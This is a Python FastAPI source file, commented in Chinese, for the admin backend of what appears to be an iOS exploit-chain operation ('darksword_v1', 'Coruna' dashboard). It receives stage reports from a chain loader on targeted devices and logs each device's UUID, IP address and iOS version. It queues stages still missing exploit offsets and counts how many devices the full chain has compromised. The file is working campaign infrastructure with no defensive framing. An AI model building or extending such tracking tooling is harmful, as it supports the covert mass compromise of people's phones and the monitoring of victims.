from admin.utils.network import get_client_ip
"""
Exploit Chain Status Router
============================

接收 chain_loader.js 上报的 6 阶段攻击链状态, 提供给 Coruna admin dashboard 实时观察。
提供两类资源:
  1. ExploitChainStatus: 每次上报 (started/succeeded/failed/placeholder_pending)
  2. ExploitChainOffsetRequest: 占位符阶段自动去重登记 (iOS 15/18.4/26 三处)

路由:
  POST /api/chain-status           - 接收单次阶段上报
  GET  /api/chain-status/{uuid}    - 查询某设备最新链状态
  GET  /api/chain-status/pending   - 查询所有待补偏移量请求
  POST /api/chain-status/resolve/{id} - 标记某占位符已补齐
  GET  /api/chain-status/summary   - 全设备概览 (dashboard 图表用)
"""

from datetime import datetime
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException, Request
from pydantic import BaseModel, Field
from sqlalchemy import select, func, and_, desc
from sqlalchemy.orm import Session

from .. import database as _db

router = APIRouter(prefix="/api/chain-status", tags=["exploit-chain"])


def get_db():
    db = _db.SessionLocal()
    try:
        yield db
    finally:
        db.close()


# ============================================================================
# Pydantic schemas
# ============================================================================
class ChainStatusReport(BaseModel):
    device_uuid: str = Field(..., min_length=1, max_length=100)
    stage: str = Field(..., min_length=1, max_length=50)
    status: str = Field(..., min_length=1, max_length=30)  # started/succeeded/failed/placeholder_pending
    detail: Optional[str] = Field(None, max_length=2000)
    chain: Optional[str] = Field("darksword_v1", max_length=50)
    ts: Optional[int] = None
    ios_version: Optional[str] = Field(None, max_length=20)
    profile_file: Optional[str] = Field(None, max_length=100)


# ============================================================================
# POST /api/chain-status
# ============================================================================
@router.post("", response_model=dict)
async def post_chain_status(report: ChainStatusReport, request: Request, db: Session = Depends(get_db)):
    """接收 chain_loader.js 上报的攻击链阶段状态。"""
    # 解析 client IP
    source_ip = get_client_ip(request)
    try:
        # x-forwarded-for 优先
        xff = request.headers.get("x-forwarded-for", "")
        if xff:
            source_ip = xff.split(",")[0].strip()
    except Exception:
        pass

    # UUID 校正
    ua = request.headers.get("user-agent", "")
    uuid = _db.normalize_device_uuid(report.device_uuid, ua) or report.device_uuid

    # 1) 写入 ExploitChainStatus
    try:
        row = _db.ExploitChainStatus(
            device_uuid=uuid,
            chain_kind=report.chain or "darksword_v1",
            stage_id=report.stage,
            status=report.status,
            detail=(report.detail or "")[:2000],
            profile_file=report.profile_file,
            ios_version=report.ios_version,
            source_ip=source_ip
        )
        db.add(row)
        db.commit()
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"db_write_failed: {e}")

    # 2) placeholder_pending 阶段 → 同时去重登记到 OffsetRequest 表
    if report.status == "placeholder_pending":
        try:
            existing = db.execute(
                select(_db.ExploitChainOffsetRequest)
                .where(and_(
                    _db.ExploitChainOffsetRequest.device_uuid == uuid,
                    _db.ExploitChainOffsetRequest.stage_id == report.stage,
                    _db.ExploitChainOffsetRequest.resolved == 0
                ))
                .limit(1)
            ).scalar_one_or_none()

            if existing is None:
                # 新登记
                offset_req = _db.ExploitChainOffsetRequest(
                    device_uuid=uuid,
                    ios_version=report.ios_version or "unknown",
                    stage_id=report.stage,
                    reason=report.detail or "[OFFSET_PENDING] reason not provided"
                )
                db.add(offset_req)
            else:
                # 重复上报 → 更新时间戳 (活跃度)
                existing.timestamp = datetime.now()
            db.commit()
        except Exception:
            db.rollback()

    # 3) 更新对应设备的 exploit_status 字段 (供 dashboard)
    try:
        device = db.execute(
            select(_db.Device).where(_db.Device.device_uuid == uuid).limit(1)
        ).scalar_one_or_none()
        if device is not None:
            _s = report.status
            _sid = report.stage
            _old = str(getattr(device, "exploit_status", "") or "").strip().lower()
            TERMINAL = {"success", "chain_failed", "unsupported", "failed", "not_supported", "incompatible"}
            if _old in TERMINAL:
                # 单调性：终态不被覆盖 (success/chain_failed 后不会回到 pending/running)
                pass
            elif _s == "succeeded" and _sid == "CHAIN":
                device.exploit_status = "success"
            elif _s == "succeeded":
                device.exploit_status = f"chain_progress:{_sid}"
            elif _s == "placeholder_pending":
                device.exploit_status = "offset_pending"
            elif _s == "failed":
                device.exploit_status = "chain_failed"
            elif _s == "started":
                device.exploit_status = f"chain_running:{_sid}"
            db.commit()
    except Exception:
        db.rollback()

    return {
        "ok": True,
        "device_uuid": uuid,
        "stage": report.stage,
        "status": report.status,
        "row_id": row.id
    }


# ============================================================================
# GET /api/chain-status/{device_uuid}  - 查某设备最新链状态
# ============================================================================
@router.get("/{device_uuid}")
def get_chain_status(device_uuid: str, limit: int = 50, db: Session = Depends(get_db)):
    uuid = _db.normalize_device_uuid(device_uuid, "") or device_uuid
    rows = db.execute(
        select(_db.ExploitChainStatus)
        .where(_db.ExploitChainStatus.device_uuid == uuid)
        .order_by(desc(_db.ExploitChainStatus.timestamp))
        .limit(min(limit, 500))
    ).scalars().all()
    return {
        "device_uuid": uuid,
        "rows": [
            {
                "stage_id": r.stage_id,
                "status": r.status,
                "detail": r.detail,
                "profile_file": r.profile_file,
                "ios_version": r.ios_version,
                "timestamp": r.timestamp.isoformat() if r.timestamp else None
            }
            for r in rows
        ]
    }


# ============================================================================
# GET /api/chain-status/pending  - 待补偏移量请求列表
# ============================================================================
@router.get("/pending/all")
def get_pending_offsets(db: Session = Depends(get_db)):
    rows = db.execute(
        select(_db.ExploitChainOffsetRequest)
        .where(_db.ExploitChainOffsetRequest.resolved == 0)
        .order_by(desc(_db.ExploitChainOffsetRequest.timestamp))
        .limit(500)
    ).scalars().all()
    # 按 (ios_version, stage_id) 聚合统计
    agg = {}
    for r in rows:
        k = f"{r.ios_version}|{r.stage_id}"
        if k not in agg:
            agg[k] = {
                "ios_version": r.ios_version,
                "stage_id": r.stage_id,
                "reason": r.reason,
                "device_count": 0,
                "first_seen": r.timestamp.isoformat() if r.timestamp else None,
                "last_seen": r.timestamp.isoformat() if r.timestamp else None,
                "ids": []
            }
        agg[k]["device_count"] += 1
        agg[k]["last_seen"] = r.timestamp.isoformat() if r.timestamp else agg[k]["last_seen"]
        agg[k]["ids"].append(r.id)

    return {
        "pending_count": len(rows),
        "groups": sorted(agg.values(), key=lambda x: -x["device_count"]),
        "raw": [
            {
                "id": r.id,
                "device_uuid": r.device_uuid,
                "ios_version": r.ios_version,
                "stage_id": r.stage_id,
                "reason": r.reason,
                "timestamp": r.timestamp.isoformat() if r.timestamp else None
            }
            for r in rows
        ]
    }


# ============================================================================
# POST /api/chain-status/resolve/{id}  - 标记某占位符已补齐
# ============================================================================
class ResolveBody(BaseModel):
    notes: Optional[str] = Field(None, max_length=2000)


@router.post("/resolve/{req_id}")
def resolve_offset(req_id: int, body: ResolveBody, db: Session = Depends(get_db)):
    row = db.execute(
        select(_db.ExploitChainOffsetRequest).where(_db.ExploitChainOffsetRequest.id == req_id).limit(1)
    ).scalar_one_or_none()
    if row is None:
        raise HTTPException(status_code=404, detail="not_found")
    row.resolved = 1
    row.resolved_at = datetime.now()
    if body.notes:
        row.notes = body.notes
    db.commit()
    return {"ok": True, "id": req_id, "resolved_at": row.resolved_at.isoformat()}


# ============================================================================
# GET /api/chain-status/summary  - dashboard 概览
# ============================================================================
@router.get("/summary/all")
def get_summary(db: Session = Depends(get_db)):
    # 1) 总设备数 (iOS 18+ 走 darksword_compatible)
    total_compat = db.execute(
        select(func.count(_db.Device.id))
        .where(_db.Device.os_type == "ios")
    ).scalar() or 0

    # 2) 按 ios_version 聚合 (distinct device count, 取最新状态)
    sub = (
        select(
            _db.ExploitChainStatus.ios_version,
            _db.ExploitChainStatus.device_uuid,
            func.max(_db.ExploitChainStatus.timestamp).label("last_ts")
        )
        .where(_db.ExploitChainStatus.ios_version.isnot(None))
        .group_by(_db.ExploitChainStatus.ios_version, _db.ExploitChainStatus.device_uuid)
        .subquery()
    )
    version_counts = db.execute(
        select(sub.c.ios_version, func.count(sub.c.device_uuid))
        .group_by(sub.c.ios_version)
        .order_by(sub.c.ios_version)
    ).all()

    # 3) pending 统计
    pending_total = db.execute(
        select(func.count(_db.ExploitChainOffsetRequest.id))
        .where(_db.ExploitChainOffsetRequest.resolved == 0)
    ).scalar() or 0

    # 4) 全链成功的设备数 (CHAIN 阶段 status=succeeded)
    full_success = db.execute(
        select(func.count(func.distinct(_db.ExploitChainStatus.device_uuid)))
        .where(and_(
            _db.ExploitChainStatus.stage_id == "CHAIN",
            _db.ExploitChainStatus.status == "succeeded"
        ))
    ).scalar() or 0

    # 5) 当前正在跑哪一阶段
    in_progress = db.execute(
        select(
            _db.ExploitChainStatus.stage_id,
            func.count(func.distinct(_db.ExploitChainStatus.device_uuid))
        )
        .where(_db.ExploitChainStatus.status == "started")
        .group_by(_db.ExploitChainStatus.stage_id)
    ).all()

    return {
        "total_ios_devices": int(total_compat),
        "full_chain_success": int(full_success),
        "pending_offsets": int(pending_total),
        "by_ios_version": {v: int(c) for v, c in version_counts if v},
        "in_progress_by_stage": {s: int(c) for s, c in in_progress},
        "supported_range": {"min": _db.MIN_SUPPORTED_IOS, "max": _db.MAX_SUPPORTED_IOS}
    }
